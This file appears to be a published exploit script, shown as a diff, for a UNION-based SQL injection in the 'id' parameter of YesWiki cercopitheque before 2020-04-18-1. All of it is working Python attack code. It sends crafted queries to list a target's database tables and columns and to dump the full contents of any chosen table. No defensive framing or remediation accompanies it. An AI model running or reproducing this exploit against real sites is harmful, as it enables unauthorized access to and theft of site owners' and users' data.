@@ -1,0 +1,134 @@
+# Exploit Title: YesWiki cercopitheque 2020.04.18.1 - 'id' SQL Injection
+# Date: 2020-04-25
+# Exploit Author: coiffeur
+# Vendor Homepage: https://yeswiki.net/
+# Software Link: https://yeswiki.net/, https://github.com/YesWiki/yeswiki
+# Version: YesWiki cercopitheque < 2020-04-18-1
+
+import sys
+
+import requests
+
+DEBUG = 0
+
+
+def usage():
+    banner = """NAME: YesWiki cercopitheque 2020-04-18-1, SQLi
+SYNOPSIS: python sqli_2020.04.18.1.py <URL> [OPTIONS]...
+DESCRIPTION:
+    -lt, list tables.
+    -dt <TABLE>, dump table.
+AUTHOR: coiffeur
+    """
+    print(banner)
+
+
+def parse(text):
+    deli_l = 'ABCAABBCC|'
+    deli_r = '|ABCAABBCC'
+    if (text.find(deli_l) == -1) or (text.find(deli_r) == -1):
+        print('[x] Delimiter not found, please try to switch to a Time Based SQLi')
+        exit(-1)
+    start = text.find(deli_l) + len(deli_l)
+    end = start + text[start::].find(deli_r)
+    return text[start:end]
+
+
+def render(elements):
+    print(elements)
+
+def get_count(t_type, table_name=None, column_name=None):
+    if t_type == 'table':
+        payload = '?BazaR&vue=consulter&id=-9475 UNION ALL SELECT (SELECT concat(0x414243414142424343,0x7c,count(TABLE_NAME),0x7c,0x414243414142424343) FROM information_schema.tables),NULL,NULL,NULL,NULL,NULL-- -'
+        if DEBUG > 1:
+            print(f'[DEBUG] {payload}')
+        r = requests.get(url=f'{sys.argv[1]}{payload}')
+        if r.status_code == 200:
+            data = parse(r.text)
+    if t_type == 'column':
+        payload = f'?BazaR&vue=consulter&id=-9475 UNION ALL SELECT (SELECT concat(0x414243414142424343,0x7c,count(COLUMN_NAME),0x7c,0x414243414142424343) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = "{table_name}"),NULL,NULL,NULL,NULL,NULL-- -'
+        if DEBUG > 1:
+            print(f'[DEBUG] {payload}')
+        r = requests.get(url=f'{sys.argv[1]}{payload}')
+        data = parse(r.text)
+    if t_type == 'element':
+        payload = f'?BazaR&vue=consulter&id=-9475 UNION ALL SELECT (SELECT concat(0x414243414142424343,0x7c,count({column_name}),0x7c,0x414243414142424343) FROM {table_name}),NULL,NULL,NULL,NULL,NULL-- -'
+        if DEBUG > 1:
+            print(f'[DEBUG] {payload}')
+        r = requests.get(url=f'{sys.argv[1]}{payload}')
+        data = parse(r.text)
+    return int(data)
+
+
+def list_tables():
+    tables_count = get_count(t_type='table')
+    print(f'[+] Tables found: {tables_count}')
+
+    tables = []
+    for i in range(0, tables_count):
+        payload = f'?BazaR&vue=consulter&id=-9475 UNION ALL SELECT (SELECT concat(0x414243414142424343,0x7c,TABLE_NAME,0x7c,0x414243414142424343) FROM information_schema.tables LIMIT 1 OFFSET {i}),NULL,NULL,NULL,NULL,NULL-- -'
+        if DEBUG > 1:
+            print(f'[DEBUG] {payload}')
+        r = requests.get(url=f'{sys.argv[1]}{payload}')
+        if r.status_code == 200:
+            talbe = parse(r.text)
+            print(f'\t{talbe}')
+            tables.append(talbe)
+    return tables
+
+
+def list_columns(table_name):
+    columns_count = get_count(t_type='column', table_name=table_name)
+    print(f'[+] Columns found: {columns_count}')
+
+    columns = []
+    for i in range(0, columns_count):
+        payload = f'?BazaR&vue=consulter&id=-9475 UNION ALL SELECT (SELECT concat(0x414243414142424343,0x7c,COLUMN_NAME,0x7c,0x414243414142424343) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = "{table_name}" LIMIT 1 OFFSET {i}),NULL,NULL,NULL,NULL,NULL-- -'
+        if DEBUG > 1:
+            print(f'[DEBUG] {payload}')
+        r = requests.get(url=f'{sys.argv[1]}{payload}')
+        if r.status_code == 200:
+            column = parse(r.text)
+            if DEBUG > 0:
+                print(f'\t{column}')
+            columns.append(column)
+    return columns
+
+
+def dump_table(name):
+    columns = list_columns(name)
+    elements = [None]*len(columns)
+    for i in range(0, len(columns)):
+        elements_count = get_count(
+            t_type='element', table_name=name, column_name=columns[i])
+        if DEBUG > 0:
+            print(f'[+] Dumping: {columns[i]} ({elements_count} rows)')
+        element = []
+        for j in range(0, elements_count):
+            payload = f'?BazaR&vue=consulter&id=-9475 UNION ALL SELECT (SELECT concat(0x414243414142424343,0x7c,{columns[i]},0x7c,0x414243414142424343) FROM {name} LIMIT 1 OFFSET {j}),NULL,NULL,NULL,NULL,NULL-- -'
+            if DEBUG > 1:
+                print(f'[DEBUG] {payload}')
+            r = requests.get(url=f'{sys.argv[1]}{payload}')
+            if r.status_code == 200:
+                element.append(parse(r.text))
+                if DEBUG > 0:
+                    print(f'\t{element[-1]}')
+        elements[i] = element
+    render(elements)
+    return elements
+
+
+def main():
+    if len(sys.argv) < 3:
+        print(usage())
+        exit(-1)
+
+    if sys.argv[2] == '-lt':
+        list_tables()
+
+    if sys.argv[2] == '-dt':
+        dump_table(sys.argv[3])
+
+
+if __name__ == "__main__":
+    main()
